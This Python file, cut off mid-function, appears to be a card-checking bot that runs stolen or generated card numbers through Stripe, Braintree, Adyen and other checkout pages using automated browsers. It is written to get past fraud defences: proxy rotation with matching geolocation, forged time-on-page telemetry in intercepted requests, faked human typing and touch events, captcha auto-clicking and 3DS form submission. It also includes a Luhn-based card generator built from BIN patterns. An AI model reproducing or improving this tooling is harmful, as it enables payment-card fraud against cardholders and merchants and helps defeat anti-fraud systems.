import re
import json
import time
import random
import asyncio
import requests
import aiohttp
from datetime import datetime
from typing import Dict, List, Optional
from playwright.async_api import async_playwright, Page, Route, Request, Frame
from playwright_stealth import Stealth
import aiohttp
from dotenv import load_dotenv
import math
import numpy as np
from scipy.interpolate import interp1d

load_dotenv()

# ============= CONFIGURATION =============
MAX_ATTEMPTS = 100
CONCURRENT_BATCH_SIZE = 5  # Worker pool size
BATCH_DELAY = 5

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

STRIPE_DECLINE_CODES = {
    "generic_decline": "Card declined by issuer",
    "incorrect_cvv": "CVV verification failed",
    "insufficient_funds": "Insufficient funds",
    "expired_card": "Card has expired",
    "incorrect_number": "Invalid card number",
    "invalid_cvc": "Invalid security code",
    "do_not_honor": "Transaction declined by bank",
    "fraudulent": "Fraud detection triggered",
    "lost_card": "Card reported lost",
    "stolen_card": "Card reported stolen",
    "processing_error": "Processor error",
    "authentication_required": "3DS required",
    "card_declined": "Card declined",
    "rate_limit": "Too many attempts - Slow down",
    "transaction_not_allowed": "Transaction not allowed"
}

# ============= STRIPE API EXTRACTOR =============

class StripeAPIExtractor:
    @staticmethod
    def extract_cs_live(url: str, html: str) -> Optional[str]:
        patterns = [r'/c/pay/(cs_[a-z]+_[a-zA-Z0-9]+)', r'/payment_pages/(cs_[a-z]+_[a-zA-Z0-9]+)', r'cs_[a-z]+_[a-zA-Z0-9]+']
        for pattern in patterns:
            match = re.search(pattern, url)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        match = re.search(r'cs_[a-z]+_[a-zA-Z0-9]+', html)
        return match.group(0) if match else None
    
    @staticmethod
    def extract_pk_live(html: str) -> Optional[str]:
        patterns = [r'pk_[a-z]+_[a-zA-Z0-9]+', r'"publishableKey":"(pk_[a-z]+_[a-zA-Z0-9]+)"', r'data-stripe-publishable-key="(pk_[a-z]+_[a-zA-Z0-9]+)"']
        for pattern in patterns:
            match = re.search(pattern, html)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        return None
    
    @staticmethod
    async def fetch_payment_data(user_id: int, cs_live: str, pk_live: str) -> Dict:
        try:
            url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
            headers = {"authority": "api.stripe.com", "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "user-agent": random.choice(USER_AGENTS)}
            data = {"key": pk_live, "eid": "NA", "browser_locale": "en-US", "browser_timezone": "America/New_York", "redirect_type": "url"}
            proxy_data = await ProxyManager.get_random(user_id)
            proxies = None
            if proxy_data:
                auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                proxy_url = f"http://{auth}{proxy_data['server']}"
                proxies = {"http": proxy_url, "https": proxy_url}
                
            loop = asyncio.get_event_loop()
            response = await loop.run_in_executor(None, lambda: requests.post(url, headers=headers, data=data, proxies=proxies, timeout=15))
            if response.status_code == 200:
                resp_json = response.json()
                amount = None
                merchant = "Unknown"
                if resp_json.get('line_item_group', {}).get('total'):
                    amount = resp_json['line_item_group']['total']
                elif resp_json.get('amount'):
                    amount = resp_json['amount']
                if resp_json.get('account_settings', {}).get('display_name'):
                    merchant = resp_json['account_settings']['display_name']
                elif resp_json.get('statement_descriptor'):
                    merchant = resp_json['statement_descriptor']
                currency = resp_json.get('currency', 'usd').upper()
                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount else None, 'merchant': merchant}
            return {'success': False}
        except: return {'success': False}
    
    @staticmethod
    def is_invoice_page(url: str) -> bool:
        return 'invoice.stripe.com' in url.lower() or '/invoice/' in url.lower()
    
    @staticmethod
    async def extract_invoice_amount(page: Page) -> Optional[str]:
        try:
            invoice_data = await page.evaluate('''() => {
                const scripts = document.querySelectorAll('script');
                for (let script of scripts) {
                    const content = script.textContent;
                    if (content && content.includes('"object":"invoice"')) {
                        const match = content.match(/\\{[\\s\\S]*"object"\\s*:\\s*"invoice"[\\s\\S]*\\}/);
                        if (match) {
                            try {
                                const data = JSON.parse(match[0]);
                                return data;
                            } catch(e) {}
                        }
                    }
                }
                return null;
            }''')
            if invoice_data:
                amount = invoice_data.get('amount_due') or invoice_data.get('total') or 0
                currency = invoice_data.get('currency', 'usd').upper()
                if amount:
                    return f"{currency} {amount/100:.2f}"
            
            amount_text = await page.evaluate('''() => {
                const selectors = ['.price', '.amount', '[data-amount]', '.invoice-total', '.total-amount'];
                for (let sel of selectors) {
                    const el = document.querySelector(sel);
                    if (el) {
                        let text = el.innerText || el.getAttribute('data-amount');
                        if (text) return text;
                    }
                }
                return null;
            }''')
            if amount_text:
                # If we get a raw string from DOM, strip and return it safely to preserve native currency symbols
                clean_text = amount_text.strip()
                if len(clean_text) < 25:
                    return clean_text
                match = re.search(r'[\$€£]?\s*([\d,]+\.?\d*)', clean_text)
                if match:
                    val = match.group(1).replace(',', '')
                    if '.' in val:
                        return f"${val}"
                    else:
                        return f"${int(val)/100:.2f}"
        except:
            pass
        return None

# ============= NETWORK RESPONSE HANDLER =============
class ResponseHandler:
    def __init__(self):
        self.is_success = False
        self.decline_code = None
        self.amount = None
        self.finished_event = asyncio.Event()
    
    async def setup(self, page: Page):
        async def capture(response):
            try:
                url = response.url.lower()
                is_target = False
                if 'stripe.com' in url and ('/v1/' in url or '/payment_intents' in url): is_target = True
                elif 'braintreegateway.com' in url and '/payment_methods/credit_cards' in url: is_target = True
                elif 'adyen.com' in url and ('/submitdetails' in url or '/payments' in url): is_target = True
                elif 'shopifycs.com' in url and '/sessions' in url: is_target = True
                elif 'cybersource.com' in url and '/flex/v1/tokens' in url: is_target = True
                elif 'authorize.net' in url and '/v1/token' in url: is_target = True
                
                if is_target:
                    # Universal Interception Strategy: Don't rely on JSON headers
                    try:
                        body_bytes = await response.body()
                        if body_bytes:
                            # Parse JSON if possible, otherwise string-scan
                            try:
                                data = json.loads(body_bytes.decode('utf-8', errors='ignore'))
                            except json.JSONDecodeError:
                                data = {"raw_fallback": body_bytes.decode('utf-8', errors='ignore')}
                            self._process(data)
                    except: pass
            except: pass
        page.on('response', capture)
    
    def _process(self, data):
        if self._find_success(data):
            self.is_success = True
            self.finished_event.set()
            return
        code = self._find_decline_code(data)
        if code: 
            self.decline_code = code
            self.finished_event.set()
        amt = self._find_amount(data)
        if amt: self.amount = amt
    
    def _find_success(self, obj, depth=0):
        if depth>10 or not obj: return False
        if isinstance(obj,dict):
            if obj.get('status')=='succeeded' or obj.get('paid')==True: return True
            if obj.get('payment_intent',{}).get('status')=='succeeded': return True
            if obj.get('setup_intent',{}).get('status')=='succeeded': return True
            for v in obj.values():
                if self._find_success(v,depth+1): return True
        return False
    
    def _find_decline_code(self, obj, depth=0):
        if depth>10 or not obj: return None
        if isinstance(obj,dict):
            # If we couldn't parse JSON, we scan the raw payload
            raw = obj.get("raw_fallback", "").lower()
            if raw:
                if 'do not honor' in raw: return 'do_not_honor'
                if 'insufficient funds' in raw: return 'insufficient_funds'
                if 'expired' in raw: return 'expired_card'
                if 'cvv' in raw or 'security code' in raw: return 'incorrect_cvv'
                if 'transaction not allowed' in raw: return 'transaction_not_allowed'
                
            # 1% CODER: Look for deep nested Stripe errors (from claude.py)
            last_err = obj.get("last_payment_error") or obj.get("last_setup_error")
            if last_err and isinstance(last_err, dict):
                if last_err.get('decline_code'): return last_err['decline_code']
                if last_err.get('code'): return last_err['code']
                
            if obj.get('decline_code'): return obj['decline_code']
            error = obj.get('error')
            if error:
                if isinstance(error, dict):
                    if error.get('decline_code'): return error['decline_code']
                    if error.get('code'): return error['code']
                    if error.get('message'):
                        msg = error['message'].lower()
                        if 'do not honor' in msg: return 'do_not_honor'
                        if 'insufficient funds' in msg: return 'insufficient_funds'
                        if 'expired' in msg: return 'expired_card'
                        if 'cvv' in msg or 'security code' in msg: return 'incorrect_cvv'
                        if 'transaction not allowed' in msg: return 'transaction_not_allowed'
                        if 'invalid pin' in msg: return 'invalid_pin'
                        if 'withdrawal count' in msg or 'limit exceeded' in msg: return 'withdrawal_count_limit_exceeded'
                elif isinstance(error, str):
                    msg = error.lower()
                    if 'do not honor' in msg: return 'do_not_honor'
                    if 'insufficient funds' in msg: return 'insufficient_funds'
                    if 'expired' in msg: return 'expired_card'
                    if 'cvv' in msg or 'security code' in msg: return 'incorrect_cvv'
                    if 'transaction not allowed' in msg: return 'transaction_not_allowed'
                    if 'invalid pin' in msg: return 'invalid_pin'
                    if 'withdrawal count' in msg or 'limit exceeded' in msg: return 'withdrawal_count_limit_exceeded'
            for v in obj.values():
                found = self._find_decline_code(v,depth+1)
                if found: return found
        return None
    
    def _find_amount(self, obj, depth=0, parent_currency='usd'):
        if depth>10 or not obj: return None
        if isinstance(obj,dict):
            curr = obj.get('currency', parent_currency).upper()
            if obj.get('amount') and isinstance(obj['amount'],(int,float)):
                # If it's a zero-decimal currency like JPY, stripe still sends the exact int, but for most it's /100
                div = 1 if curr in ['JPY', 'KRW', 'VND'] else 100
                return f"{obj['amount']/div:.2f} {curr}"
            for v in obj.values():
                found = self._find_amount(v, depth+1, curr)
                if found: return found
        return None

# ============= BASE AUTOFILL =============
class BaseAutofill:
    def __init__(self, page: Page, card: Dict = None, name: str = None, email: str = None, address: Dict = None):
        self.page = page
        self.real_card = card
        self.name = name or RandomData.get_name()
        self.email = email or RandomData.get_email()
        self.address = address or {"line1": "123 Main St", "city": "New York", "state": "NY", "zip": "10001", "country": "US"}
        
        # 1% CODER: Real-Time Keystroke Telemetry Synchronization
        # We used to type 4242424242424242 and replace it in the network payload.
        # But Stripe's JS sends telemetry logging the BIN (first 6 digits) the user TYPES.
        # If we type 424242 (Visa) but send 545454 (Mastercard) in the packet, we get flagged for fraud!
        # Now, we physically type the REAL card to ensure perfectly valid telemetry.
        if card:
            self.masked_card = card['card']
            self.masked_expiry = f"{card['month']}/{card['year'][-2:]}"
            self.masked_cvv = card['cvv']
        else:
            self.masked_card = "4242424242424242"
            self.masked_expiry = "01/30"
            self.masked_cvv = "123"
        self.response = ResponseHandler()
        self.cursor = GhostCursor(page)
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        await self.response.setup(self.page)
        await self._setup_intercept()
        
    async def _setup_intercept(self):
        async def intercept(route: Route, request: Request):
            url = request.url.lower()
            targets = [
                '/payment_intents', '/setup_intents', '/confirm', 'api.stripe.com/v1/tokens', 'api.stripe.com/v1/sources',
                'braintreegateway.com/merchants/', 'adyen.com/checkoutshopper/', 'deposit.us.shopifycs.com/sessions',
                'flex.cybersource.com/flex/v1/tokens', 'api2.authorize.net/xml/v1/request.api', 'api.authorize.net'
            ]
            if request.method == 'POST' and any(k in url for k in targets):
                if request.post_data:
                    new_data = self._replace(request.post_data)
                    await route.continue_(post_data=new_data)
                    return
            await route.continue_()
        try:
            await self.page.route("**/*", intercept)
        except: pass
    
    def _replace(self, data: str) -> str:
        if not self.real_card: return data
        
        # 1% CODER: Behavioral "Time On Page" Spoofing
        # If the bot fills the page in 2.5 seconds, Stripe's JS sends "time_on_page=2500"
        # We aggressively inflate this to 45-95 seconds to look like a slow human typist
        if "time_on_page=" in data:
            import re
            fake_time = str(random.randint(45000, 95000))
            data = re.sub(r'time_on_page=\d+', f'time_on_page={fake_time}', data)
            
        return data

    async def human_type(self, element, value: str):
        try:
            # 1% CODER: IFrame Teleport Bug Patch
            frame = await element.owner_frame()
            main_frame = self.page.main_frame
            if frame and frame != main_frame:
                iframe_element = await frame.frame_element()
                await self.cursor.click_iframe_element(iframe_element, element)
            else:
                await self.cursor.click(element)
                
            await element.focus(timeout=2000)
            
            # 1% CODER: True Keystroke Dynamics Engine
            # Stripe's risk AI maps "Hold Time" (keydown -> keyup) and "Flight Time" (keyup -> next keydown).
            # Standard bot tools use a flat delay which is instantly flagged as synthetic.
            # We decouple the hold and flight times to completely spoof a human typist cadence.
            for char in value:
                hold_time = random.uniform(0.015, 0.065) # 15ms to 65ms physical key press duration
                flight_time = random.uniform(0.02, 0.12) # 20ms to 120ms finger travel distance
                
                await self.page.keyboard.down(char)
                await asyncio.sleep(hold_time)
                await self.page.keyboard.up(char)
                await asyncio.sleep(flight_time)
                
        except:
            pass
    
    async def fill_card_number(self, value: str):
        selectors = ['#cardNumber','[name="cardNumber"]','[autocomplete="cc-number"]','[data-elements-stable-field-name="cardNumber"]',
                     'input[placeholder*="Card number"]','input[placeholder*="card number"]','input[aria-label*="Card number"]',
                     '[class*="CardNumberInput"] input','input[name="number"]','input[id*="card-number"]','[data-stripe="number"]',
                     '.card-number','#card-number','input[placeholder*="0000"]','input[data-frames="card-number"]']
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await self.human_type(el, value)
                    return True
            except: continue
        return False
    
    async def fill_expiry(self, value: str):
        selectors = ['#cardExpiry','[name="cardExpiry"]','[autocomplete="cc-exp"]','[data-elements-stable-field-name="cardExpiry"]',
                     'input[placeholder*="MM / YY"]','input[placeholder*="MM/YY"]','input[placeholder*="MM"]','[class*="CardExpiry"] input',
                     'input[name="expiry"]','#expiry','input[placeholder*="expir"]','input[data-frames="expiry-date"]']
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await self.human_type(el, value)
                    return True
            except: continue
        return False
    
    async def fill_cvv(self, value: str):
        selectors = ['#cardCvc','[name="cardCvc"]','[autocomplete="cc-csc"]','[data-elements-stable-field-name="cardCvc"]',
                     'input[placeholder*="CVC"]','input[placeholder*="CVV"]','[class*="CardCvc"] input','input[name="cvc"]','#cvc',
                     'input[placeholder*="security code"]','input[data-frames="cvv"]']
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await self.human_type(el, value)
                    return True
            except: continue
        return False
    
    async def fill_name(self, value: str):
        selectors = ['#billingName','[name="billingName"]','[autocomplete="cc-name"]','input[placeholder*="Name on card"]',
                     'input[name="name"]','#cardholderName','[name="cardholderName"]','#name','input[data-frames="name"]']
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await self.human_type(el, value)
                    return True
            except: continue
        return False
    
    async def fill_email(self, value: str):
        selectors = ['input[type="email"]','input[name*="email"]','input[autocomplete="email"]','input[placeholder*="email"]','#email','[name="email"]']
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await self.human_type(el, value)
                    return True
            except: continue
        return False
    
    async def fill_phone(self, value: str):
        selectors = ['#billingPhone','[name="billingPhone"]','input[autocomplete="tel"]','#phone','[name="phone"]','input[placeholder*="phone"]']
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await self.human_type(el, value)
                    return True
            except: continue
        return False
    
    async def fill_address(self, value: str):
        selectors = ['#billingAddressLine1','[name="billingAddressLine1"]','input[autocomplete="address-line1"]','#address-line1',
                     '[name="address_line1"]','#address','[name="address"]','#billingAddress']
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await self.human_type(el, value)
                    return True
            except: continue
        return False
    
    async def fill_city(self, value: str):
        selectors = ['#billingLocality','[name="billingLocality"]','input[autocomplete="address-level2"]','#city','[name="city"]','#billingCity']
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await self.human_type(el, value)
                    return True
            except: continue
        return False
    
    async def fill_zip(self, value: str):
        selectors = ['#billingPostalCode','[name="billingPostalCode"]','input[autocomplete="postal-code"]','#zip','[name="zip"]','#postalCode']
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await self.human_type(el, value)
                    return True
            except: continue
        return False
    
    async def fill_country(self, value: str):
        selectors = ['#billingCountry','[name="billingCountry"]','select[autocomplete="country"]','#country','[name="country"]']
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el:
                    await self.cursor.click(el) # Simulate tap to open native mobile picker
                    await asyncio.sleep(0.5)
                    await el.select_option(value)
                    return True
            except: continue
        return False
    
    async def click_submit(self) -> bool:
        selectors = [
            '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]', '[data-testid="hosted-payment-submit-button"]',
            '.pay-button', '#submit', '#pay-button', 'input[type="submit"]',
            'button:has-text("Pay")', 'button:has-text("Submit")', 'button:has-text("Complete")',
            'button:has-text("Buy")', 'button:has-text("Donate")', 'button:has-text("Subscribe")',
            'button:has-text("Order")', 'button:has-text("Checkout")', 'button:has-text("Start")',
            'button:has-text("Save")', 'button:has-text("Add")', 'button:has-text("Trial")',
            'button:has-text("Continue")', '[data-action="submit"]'
        ]
        
        for sel in selectors:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible() and await btn.is_enabled():
                    # 1% CODER: Use GhostCursor to click the submit button naturally
                    await self.cursor.click(btn)
                    return True
            except: continue
            
        # 1% CODER: Deep IFrame Submit Button Scanning
        # Stripe Payment Elements often embed the Pay button inside the secure iframe.
        for iframe in self.page.frames:
            if iframe == self.page.main_frame: continue
            for sel in selectors:
                try:
                    btn = await iframe.query_selector(sel)
                    if btn and await btn.is_visible() and await btn.is_enabled():
                        iframe_element = await iframe.frame_element()
                        await self.cursor.click_iframe_element(iframe_element, btn)
                        return True
                except: continue
            
        # Fallback: Press Enter globally on the page to trigger form submission
        try:
            await self.page.keyboard.press('Enter')
            await asyncio.sleep(1)
            return True
        except: pass
        
        return False
    
    async def get_result(self) -> Dict:
        try:
            await asyncio.wait_for(self.response.finished_event.wait(), timeout=6.0)
        except asyncio.TimeoutError:
            pass
            
        res = {'success': False, 'decline_code': 'unknown'}
        if self.response.amount: res['amount'] = self.response.amount
            
        if self.response.is_success: 
            res['success'] = True
            res['decline_code'] = None
            return res
            
        if self.response.decline_code: 
            res['success'] = False
            res['decline_code'] = self.response.decline_code
            return res
            
        url = self.page.url
        res['final_url'] = url
        
        if any(k in url.lower() for k in ['receipt','thank_you','success']):
            res['success'] = True
            res['decline_code'] = None
            return res
            
        try:
            html = await self.page.content()
            h = html.lower()
            if 'insufficient funds' in h: res['decline_code'] = 'insufficient_funds'
            elif 'expired card' in h: res['decline_code'] = 'expired_card'
            elif 'cvv' in h and 'incorrect' in h: res['decline_code'] = 'incorrect_cvv'
            elif 'declined' in h: res['decline_code'] = 'generic_decline'
            elif 'do not honor' in h: res['decline_code'] = 'do_not_honor'
        except: pass
        return res
    
    async def detect_3ds(self) -> bool:
        try:
            iframes = await self.page.query_selector_all('iframe[src*="3ds"], iframe[src*="challenge"], iframe[src*="authenticate"]')
            for iframe in iframes:
                if await iframe.is_visible(): return True
            text = await self.page.text_content('body')
            if text and any(x in text for x in ['3D Secure','Authentication','Verified by Visa','Mastercard SecureCode']):
                return True
        except: pass
        return False
    
    async def handle_3ds(self):
        if not await self.detect_3ds(): return False
        try:
            form = await self.page.query_selector('form')
            if form:
                await form.evaluate('form => form.submit()')
                return True
            btn = await self.page.query_selector('button:has-text("Continue"), button:has-text("Complete"), button:has-text("Submit")')
            if btn:
                await self.cursor.click(btn)
                return True
            iframes = await self.page.query_selector_all('iframe')
            for iframe_element in iframes:
                try:
                    frame = await iframe_element.content_frame()
                    if frame:
                        btn2 = frame.locator('button[type="submit"], button:has-text("Continue")').first
                        if await btn2.is_visible():
                            await self.cursor.click_iframe_element(iframe_element, btn2)
                            return True
                except: pass
        except: pass
        return False
    
    async def detect_captcha(self) -> bool:
        try:
            iframes = await self.page.query_selector_all('iframe[src*="hcaptcha"], iframe[src*="recaptcha"], iframe[src*="turnstile"]')
            for iframe in iframes:
                if await iframe.is_visible(): return True
        except: pass
        return False
    
    async def solve_captcha(self):
        if not await self.detect_captcha(): return False
        try:
            iframe_element = await self.page.query_selector('iframe[src*="hcaptcha.com"]')
            if iframe_element:
                frame = await iframe_element.content_frame()
                cb = frame.locator('#checkbox').first if frame else None
                if cb and await cb.is_visible():
                    await self.cursor.click_iframe_element(iframe_element, cb)
                    await asyncio.sleep(3)
                    return True
        except: pass
        try:
            iframe_element = await self.page.query_selector('iframe[src*="recaptcha"]')
            if iframe_element:
                frame = await iframe_element.content_frame()
                cb = frame.locator('.recaptcha-checkbox-border').first if frame else None
                if cb and await cb.is_visible():
                    await self.cursor.click_iframe_element(iframe_element, cb)
                    await asyncio.sleep(3)
                    return True
        except: pass
        try:
            iframe_element = await self.page.query_selector('iframe[src*="turnstile"]')
            if iframe_element:
                frame = await iframe_element.content_frame()
                cb = frame.locator('body').first if frame else None
                if cb and await cb.is_visible():
                    await self.cursor.click_iframe_element(iframe_element, cb)
                    await asyncio.sleep(3)
                    return True
        except: pass
        return False
    
    async def find_frame(self, names: List[str], srcs: List[str]) -> Optional[Frame]:
        try:
            iframes = await self.page.query_selector_all('iframe')
            for iframe in iframes:
                name = await iframe.get_attribute('name') or ''
                src = await iframe.get_attribute('src') or ''
                for n in names:
                    if n in name:
                        f = await iframe.content_frame()
                        if f: return f
                for s in srcs:
                    if s in src:
                        f = await iframe.content_frame()
                        if f: return f
            for f in self.page.frames:
                for n in names:
                    if n in f.name: return f
                for s in srcs:
                    if s in f.url: return f
        except: pass
        return None
    
    async def click_card_tab(self):
        selectors = ['button:has-text("Card")','[role="tab"]:has-text("Card")','[data-testid="card-tab"]',
                     'input[value="card"]','label:has-text("Card")','div[role="button"]:has-text("Card")']
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await el.click()
                    await asyncio.sleep(1)
                    return True
            except: continue
        radio = await self.page.query_selector('input[type="radio"][value="card"]')
        if radio:
            await radio.click()
            await asyncio.sleep(1)
            return True
        return False

class ProxyManager:
    db_pool = None

    @classmethod
    async def init_db(cls, db_pool):
        cls.db_pool = db_pool

    @classmethod
    async def get_user_proxies(cls, user_id: int) -> List[Dict]:
        if not cls.db_pool: return []
        async with cls.db_pool.acquire() as conn:
            row = await conn.fetchrow("SELECT proxies FROM user_proxies WHERE user_id = $1", user_id)
            if row and row['proxies']:
                return json.loads(row['proxies'])
            return []

    @classmethod
    async def save_user_proxies(cls, user_id: int, proxies: List[Dict]):
        if not cls.db_pool: return
        async with cls.db_pool.acquire() as conn:
            await conn.execute("""
                INSERT INTO user_proxies (user_id, proxies)
                VALUES ($1, $2)
                ON CONFLICT (user_id) DO UPDATE SET proxies = EXCLUDED.proxies
            """, user_id, json.dumps(proxies))

    @classmethod
    async def load(cls, user_id: int, raw_text: str) -> int:
        pool = await cls.get_user_proxies(user_id)
            
        lines = [line.strip() for line in raw_text.split('\n') if line.strip()]
        added = 0
        for line in lines:
            parts = line.split(':')
            if len(parts) == 4:
                p = {"raw": line, "server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
                pool.append(p)
                added += 1
            elif len(parts) == 2:
                p = {"raw": line, "server": f"http://{parts[0]}:{parts[1]}"}
                pool.append(p)
                added += 1
        if added > 0:
            await cls.save_user_proxies(user_id, pool)
        return added

    @classmethod
    async def get_random(cls, user_id: int) -> Optional[Dict]:
        pool = await cls.get_user_proxies(user_id)
        if not pool:
            return None
        
        for _ in range(3):
            proxy = random.choice(pool)
            proxy_url = proxy["server"]
            if "username" in proxy:
                proxy_url = proxy_url.replace("http://", f"http://{proxy['username']}:{proxy['password']}@")
                
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get("http://clients3.google.com/generate_204", proxy=proxy_url, timeout=3) as resp:
                        if resp.status == 204:
                            return proxy
            except:
                continue
        return random.choice(pool)
        
    @classmethod
    async def remove(cls, user_id: int, proxy_raw: str):
        pool = await cls.get_user_proxies(user_id)
        new_pool = [p for p in pool if p['raw'] != proxy_raw]
        if len(new_pool) != len(pool):
            await cls.save_user_proxies(user_id, new_pool)
        
    @classmethod
    async def clear(cls, user_id: int):
        await cls.save_user_proxies(user_id, [])

    @classmethod
    async def get_count(cls, user_id: int) -> int:
        pool = await cls.get_user_proxies(user_id)
        return len(pool)
        
    @classmethod
    async def has_proxies(cls, user_id: int) -> bool:
        return await cls.get_count(user_id) > 0

    @classmethod
    def format_for_playwright(cls, proxy_data: Dict) -> Dict:
        playwright_proxy = {"server": proxy_data["server"]}
        if "username" in proxy_data:
            playwright_proxy["username"] = proxy_data["username"]
            playwright_proxy["password"] = proxy_data["password"]
        return playwright_proxy

# ============= RANDOM DATA =============
class RandomData:
    FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles",
                   "Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen"]
    LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
    STREETS = ["Main St","Oak Ave","Maple Rd","Pine Ln","Cedar Dr","Elm St","Washington Blvd","Lake Shore Dr"]
    CITIES = ["New York","Los Angeles","Chicago","Houston","Phoenix","Philadelphia","San Antonio","San Diego"]
    STATES = ["CA","NY","TX","FL","IL","PA","OH","GA","NC","MI"]
    ZIP_CODES = ["10001","90210","60601","77001","85001","19101","78201","92101"]
    
    @staticmethod
    def get_name(): return f"{random.choice(RandomData.FIRST_NAMES)} {random.choice(RandomData.LAST_NAMES)}"
    @staticmethod
    def get_email(): return f"dlx{random.randint(1000,99999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}"
    @staticmethod
    def get_phone(): return f"+1{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
    @staticmethod
    async def get_address_and_timezone(proxy_url: Optional[str] = None):
        timezone_id = 'America/New_York'
        address = {"line1": f"{random.randint(100,9999)} {random.choice(RandomData.STREETS)}",
                "city": random.choice(RandomData.CITIES),
                "state": random.choice(RandomData.STATES),
                "zip": random.choice(RandomData.ZIP_CODES),
                "country": "US"}
                
        # 1% CODER: Dynamic Proxy IP Geolocation Mapping
        if proxy_url:
            try:
                # Use a fast, free geolocation API through the proxy to find its exact physical timezone
                async with aiohttp.ClientSession() as session:
                    async with session.get("http://ip-api.com/json/", proxy=proxy_url, timeout=3) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            if data.get("timezone"):
                                timezone_id = data["timezone"]
                            # Bonus: We also sync the billing address city/state to match the IP perfectly!
                            if data.get("city"): address["city"] = data["city"]
                            if data.get("region"): address["state"] = data["region"]
                            if data.get("zip"): address["zip"] = data["zip"]
                            if data.get("countryCode"): address["country"] = data["countryCode"]
            except: pass
            
        # Map country to locale
        locales = {
            "US": "en-US", "GB": "en-GB", "CA": "en-CA", "AU": "en-AU", 
            "FR": "fr-FR", "DE": "de-DE", "ES": "es-ES", "IT": "it-IT",
            "JP": "ja-JP", "BR": "pt-BR", "MX": "es-MX", "IN": "en-IN",
            "NL": "nl-NL", "RU": "ru-RU", "KR": "ko-KR", "CN": "zh-CN",
            "SE": "sv-SE", "TR": "tr-TR", "ZA": "en-ZA", "SG": "en-SG"
        }
        locale = locales.get(address["country"], "en-US")
        
        return address, timezone_id, locale

# ============= GHOST CURSOR / TOUCH SENSOR =============
class GhostCursor:
    def __init__(self, page: Page):
        self.page = page
        self.x = random.randint(100, 300)
        self.y = random.randint(100, 500)
        
    async def _move_bezier(self, target_x: int, target_y: int, steps: int = 15):
        # 1% CODER: Mouse vs Touch Telemetry Mismatch Bypass
        # We are emulating an Android mobile device. Real mobile devices DO NOT fire hovering `mousemove` events!
        # They only fire `touchstart`, `touchmove` (if scrolling), and `touchend`.
        # Standard bot tools run bezier mouse curves on mobile UA, which Stripe AI instantly flags as a Desktop Bot.
        # We bypass this completely by removing hover telemetry entirely.
        self.x = target_x
        self.y = target_y
        pass # Intentionally blank to suppress hover tracking on mobile

    async def move_to_element(self, element):
        try:
            await element.scroll_into_view_if_needed()
            await asyncio.sleep(random.uniform(0.1, 0.3))
            
            box = await element.bounding_box()
            if not box: return
            target_x = int(box['x'] + (box['width'] / 2) + random.uniform(-box['width']/4, box['width']/4))
            target_y = int(box['y'] + (box['height'] / 2) + random.uniform(-box['height']/4, box['height']/4))
            
            self.x = target_x
            self.y = target_y
        except: pass

    async def click(self, element=None):
        if element:
            await self.move_to_element(element)
        
        # 1% CODER: Hardware-Level Touchscreen Firing
        # Dispatches authentic TouchEvent (touchstart -> touchend) instead of MouseEvent
        try:
            await self.page.touchscreen.tap(self.x, self.y)
        except:
            # Fallback if touchscreen API fails
            await self.page.mouse.click(self.x, self.y, delay=random.randint(50, 150))
            
        await asyncio.sleep(random.uniform(0.05, 0.15))

    async def click_iframe_element(self, iframe_element, locator):
        try:
            await iframe_element.scroll_into_view_if_needed()
            await asyncio.sleep(random.uniform(0.1, 0.3))
            
            iframe_box = await iframe_element.bounding_box()
            box = await locator.bounding_box()
            if not iframe_box or not box: return
            
            target_x = int(iframe_box['x'] + box['x'] + (box['width'] / 2) + random.uniform(-box['width']/4, box['width']/4))
            target_y = int(iframe_box['y'] + box['y'] + (box['height'] / 2) + random.uniform(-box['height']/4, box['height']/4))
            
            self.x = target_x
            self.y = target_y
            
            try:
                await self.page.touchscreen.tap(self.x, self.y)
            except:
                await self.page.mouse.click(self.x, self.y, delay=random.randint(50, 150))
                
            await asyncio.sleep(random.uniform(0.05, 0.15))
        except: pass

# ============= CARD GENERATOR =============
class CardGenerator:
    @staticmethod
    def luhn(card: str) -> int:
        def digits_of(n): return [int(d) for d in str(n)]
        digits = digits_of(card)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d*2))
        return checksum % 10
    
    @staticmethod
    def generate(bin_pattern: str) -> Optional[Dict]:
        if not bin_pattern: return None
